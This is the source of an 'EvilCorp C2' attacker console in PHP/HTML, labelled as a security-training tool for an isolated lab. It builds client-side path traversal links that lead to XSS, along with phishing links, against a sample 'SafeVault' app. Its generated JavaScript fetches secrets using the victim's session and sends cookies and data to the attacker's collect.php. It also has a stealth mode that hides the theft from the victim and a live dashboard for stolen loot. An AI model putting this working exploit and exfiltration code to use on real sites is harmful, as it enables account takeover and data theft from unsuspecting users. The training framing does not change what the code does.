<?php
/* ============================================================================
 *  EvilCorp C2 - ATTACKER console (PHP / Apache version)
 *  Drop this folder's files into /var/www/html on the ATTACKER machine.
 *  FOR SECURITY TRAINING ON AN ISOLATED MACHINE ONLY.
 *
 *  Files:  index.php (dashboard) | phish.php (lure) | collect.php (exfil sink)
 *          loot.php (JSON feed the dashboard polls)
 * ==========================================================================*/
?>
<!doctype html>
<html><head><meta charset="utf-8"><title>EvilCorp C2</title>
<style>
  *{box-sizing:border-box}
  body{font-family:system-ui,Segoe UI,Arial,sans-serif;margin:0;background:#0a0a0a;color:#d1fae5;font-size:17px}
  header{background:#111;padding:16px 24px;border-bottom:1px solid #14532d;display:flex;gap:10px;align-items:center}
  header b{font-size:24px;color:#34d399}
  .tag{margin-left:auto;font-size:15px;color:#6b7280}
  main{padding:28px;max-width:1040px;margin:0 auto}
  h2{color:#34d399;border-bottom:1px solid #14532d;padding-bottom:6px;font-size:24px}
  label{display:block;font-size:15px;color:#9ca3af;margin:14px 0 5px}
  input,select{width:100%;padding:12px;border-radius:7px;border:1px solid #14532d;background:#0f0f0f;color:#d1fae5;font-size:16px}
  .box{border:1px solid #14532d;border-radius:10px;padding:20px;margin:14px 0;background:#0d1117}
  .out{word-break:break-all;background:#000;border:1px solid #14532d;border-radius:7px;padding:14px;
       font-family:ui-monospace,Consolas,monospace;font-size:14px;color:#7dd3fc;margin-top:8px;line-height:1.5}
  button{padding:11px 18px;border:0;border-radius:7px;background:#059669;color:#fff;font-weight:600;
         cursor:pointer;margin-top:12px;font-size:16px}
  a.link{color:#7dd3fc;font-size:16px}
  table{width:100%;border-collapse:collapse;margin-top:10px;font-size:15px}
  th,td{border:1px solid #14532d;padding:10px;text-align:left;vertical-align:top}
  th{background:#052e16;color:#34d399}
  td.data{font-family:ui-monospace,Consolas,monospace;color:#fca5a5;white-space:pre-wrap;word-break:break-all;font-size:14px}
  .empty{color:#6b7280;font-style:italic}
  small{color:#6b7280;font-size:14px}
</style></head>
<body>
  <header><b>&#128127; EvilCorp C2</b>
    <span class="tag">Client Side Path Traversal &rarr; XSS &rarr; data theft</span></header>
  <main>
    <h2>1. Build the attack</h2>
    <div class="box">
      <label>Attack scenario</label>
      <select id="scenario" onchange="onScenario()">
        <option value="doc">Scenario 1 &mdash; Documents (/documents/ &rarr; /preview/)</option>
        <option value="note">Scenario 2 &mdash; Secure Notes &middot; harder (.json suffix, /notes/ &rarr; /render/)</option>
      </select>
      <label>Target (vulnerable app base URL)</label>
      <input id="target" value="http://192.168.1.185">
      <label>Endpoint to steal from the victim's session</label>
      <input id="steal" value="/api.php/documents/secret">
      <label>Collector URL (this server) &mdash; auto-detected</label>
      <input id="collector">
      <label>After exploitation (what the victim sees)</label>
      <select id="mode" onchange="build()">
        <option value="stealth">Stealth &mdash; exfiltrate silently, then show a normal document (victim suspects nothing)</option>
        <option value="deface">Deface &mdash; red "account compromised" overlay (proves execution, for demos)</option>
      </select>
      <button onclick="build()">Generate payload &amp; phishing link</button>

      <label style="margin-top:18px">Injected JavaScript (runs on the victim, in the SafeVault origin)</label>
      <div class="out" id="js"></div>

      <label>CSPT malicious link (this is what the victim opens)</label>
      <div class="out" id="link"></div>
      <div id="scenarioNote" style="color:#9ca3af;font-size:14px;margin-top:8px;line-height:1.5"></div>

      <button onclick="copyLink()">Copy malicious link</button>
      <a class="link" id="openphish" href="#" target="_blank" style="margin-left:14px">Open the phishing page &rarr;</a>
    </div>

    <h2>2. Stolen data (live)</h2>
    <div class="box">
      <table><thead><tr><th style="width:150px">Time</th><th style="width:120px">Victim IP</th>
        <th>Cookie</th><th>Exfiltrated data</th></tr></thead>
      <tbody id="loot"><tr><td colspan="4" class="empty">Waiting for a victim to open the link&hellip;</td></tr></tbody></table>
      <button onclick="clearLoot()">Clear loot</button>
      <small style="margin-left:14px">Auto-refreshes every 5s.</small>
    </div>
  </main>

<script>
  document.getElementById('collector').value = location.origin;

  function payloadJS(steal, collector, mode){
    // Runs inside the victim's authenticated SafeVault session:
    //  1) fetch the secret using the victim's own cookies
    //  2) beacon cookie + data back to the collector via an <img> (no CORS)
    //  3) then EITHER deface loudly (proof, for demos) OR stay stealthy
    //     (redirect to a normal document so the victim suspects nothing).
    // Built entirely with DOM APIs + textContent -> no HTML entities or
    // nested quotes to get mangled inside the onerror="" attribute.

    // Shared head: opens .then(function(d){ ... }) after firing the beacon.
    var head =
        "fetch('" + steal + "',{credentials:'same-origin',cache:'no-store'})"
      + ".then(function(r){return r.text();})"
      // If the document fetch ever fails (e.g. the steal endpoint resolves
      // cross-origin and CORS blocks it), still run + beacon the cookie
      // instead of failing silently -> the demo never "does nothing".
      + ".catch(function(){return '[document fetch failed - cookie still stolen]';})"
      + ".then(function(d){"
      +   "var i=new Image();"
      +   "i.src='" + collector + "/collect.php?cookie='"
      +      "+encodeURIComponent(document.cookie)+'&data='+encodeURIComponent(d);";

    if (mode === 'stealth') {
      // STEALTH: no visible trace. Immediately hide the reflected payload,
      // let the cookie beacon go out, then quietly send the victim to a
      // normal-looking document. They just see a working SafeVault page.
      return "var _t=document.getElementById('title');if(_t){_t.textContent='Loading\\u2026';}"
        +    "var _b=document.getElementById('body');if(_b){_b.innerHTML='';}"
        +    head
        +      "setTimeout(function(){location.replace('./?doc=2');},60);"
        +    "});";
    }

    // DEFACE (default for teaching): full-screen overlay proving code execution.
    return head
      +   "var o=document.createElement('div');"
      +   "o.style.cssText='position:fixed;top:0;left:0;right:0;bottom:0;z-index:99999;"
      +      "background:#7f1d1d;color:#fff;font:20px/1.6 system-ui,Arial;padding:6vw;overflow:auto';"
      +   "function add(tag,txt,css){var e=document.createElement(tag);e.textContent=txt;"
      +      "if(css){e.style.cssText=css;}o.appendChild(e);return e;}"
      +   "add('div','\\u2620',' font-size:64px');"
      +   "add('h1','Account compromised: CSPT -> XSS','font-size:34px;margin:0 0 6px');"
      +   "add('p','Attacker JavaScript is running in your SafeVault session and has "
      +      "exfiltrated your data to a remote server.');"
      +   "add('h3','Your session cookie');"
      +   "add('pre',document.cookie,'white-space:pre-wrap;word-break:break-all;"
      +      "background:#00000040;padding:12px;border-radius:8px');"
      +   "add('h3','Stolen confidential document');"
      +   "add('pre',d,'white-space:pre-wrap;word-break:break-all;"
      +      "background:#00000040;padding:12px;border-radius:8px');"
      +   "document.body.appendChild(o);"
      + "});";
  }

  function b64url(s){
    var b = btoa(unescape(encodeURIComponent(s)));
    return b.replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
  }

  var LINK = '';
  function build(){
    var scenario  = document.getElementById('scenario').value;
    var mode      = document.getElementById('mode').value;
    var target    = document.getElementById('target').value.replace(/\/+$/,'');
    var steal     = document.getElementById('steal').value;
    var collector = document.getElementById('collector').value.replace(/\/+$/,'');

    var js   = payloadJS(steal, collector, mode);
    // The HTML the sink reflects and innerHTML executes.
    // <img onerror> fires because src=x is invalid -> runs our JS.
    var html = '<img src=x onerror="' + js.replace(/"/g,'&quot;') + '">';
    var b64  = b64url(html);

    var note;
    if (scenario === 'note') {
      // Scenario 2 (harder): the notes viewer fetches api.php/notes/<id>.json,
      // so it ALWAYS appends ".json". Ending the payload with "?" pushes that
      // ".json" into the query string, leaving a clean /render/<b64> path
      // (the /render sink uses STRICT base64, so the suffix must not survive).
      //   api.php/notes/../render/<b64>?.json  ->  api.php/render/<b64> + ?.json
      LINK = target + '/?note=' + encodeURIComponent('../render/' + b64 + '?');
      note = 'Scenario 2: the trailing "?" in the payload sheds the app-appended '
           + '".json" into the query string, so the path resolves to /render/<b64> '
           + '(strict base64). Without it the naive ../render/<b64> becomes '
           + '/render/<b64>.json and decode fails — no XSS.';
    } else {
      // Scenario 1 (classic): ?doc=../preview/<b64> escapes api.php/documents/
      // into api.php/preview/ (non-strict reflecting sink).
      LINK = target + '/?doc=' + encodeURIComponent('../preview/' + b64);
      note = 'Scenario 1: ?doc=../preview/<b64> path-traverses /documents/ into '
           + 'the /preview/ reflecting sink, which innerHTML executes.';
    }

    document.getElementById('js').textContent           = js;
    document.getElementById('link').textContent         = LINK;
    document.getElementById('scenarioNote').textContent = note;
    document.getElementById('openphish').href           = 'phish.php?to=' + encodeURIComponent(LINK);
  }

  // Swap the default "steal" endpoint to match the chosen scenario, then rebuild.
  function onScenario(){
    var s = document.getElementById('scenario').value;
    document.getElementById('steal').value =
        (s === 'note') ? '/api.php/notes/ssh.json' : '/api.php/documents/secret';
    build();
  }

  function copyLink(){ if(LINK){ navigator.clipboard.writeText(LINK); } }

  function esc(s){ return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

  async function poll(){
    try{
      // Cache-buster + no-store: without these the browser serves a cached
      // loot.php and the dashboard never shows new victims until a manual reload.
      var r = await fetch('loot.php?_=' + Date.now(), {cache:'no-store'});
      var rows = await r.json();
      var tb = document.getElementById('loot');
      if(!rows.length){
        tb.innerHTML = '<tr><td colspan="4" class="empty">Waiting for a victim to open the link&hellip;</td></tr>';
        return;
      }
      tb.innerHTML = rows.slice().reverse().map(function(x){
        return '<tr><td>'+esc(x.time)+'</td><td>'+esc(x.ip)+'</td>'
             + '<td class="data">'+esc(x.cookie)+'</td>'
             + '<td class="data">'+esc(x.data)+'</td></tr>';
      }).join('');
    }catch(e){}
  }
  async function clearLoot(){
    if(!confirm('Delete all collected loot?')) return;
    try{ await fetch('clear.php', {method:'POST', cache:'no-store'}); }catch(e){}
    poll();
  }

  build();
  setInterval(poll, 5000); poll();
</script>
</body></html>
